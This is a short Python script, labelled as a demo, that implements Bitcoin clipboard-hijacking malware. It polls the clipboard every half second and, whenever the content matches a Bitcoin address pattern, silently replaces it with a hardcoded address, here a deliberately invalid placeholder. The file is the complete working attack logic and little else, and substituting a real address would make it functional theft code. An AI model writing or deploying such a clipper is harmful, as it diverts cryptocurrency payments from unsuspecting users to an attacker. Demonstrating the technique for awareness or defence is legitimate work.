# This file contains code for a simple Bitcoin address-swapping malware demo
#
# Author: Josh McIntyre
#
import re
import pyperclip
import time

# Define some constants for our demo
BITCOIN_REGEX_DEF = "^[13][a-km-zA-HJ-NP-Z0-9]{26,33}$"

MALICIOUS = "1fakedontsendinvalidmfBsbif4miY36v"

# The main entry point for the program
def main():

    while(True):

        # Fetch the current clipboard data
        data = pyperclip.paste()
        
        # Check if the data matches a Bitcoin address format
        if re.match(BITCOIN_REGEX_DEF, data):
            pyperclip.copy(MALICIOUS)        
            
        time.sleep(0.5)

if __name__ == "__main__":
    main()
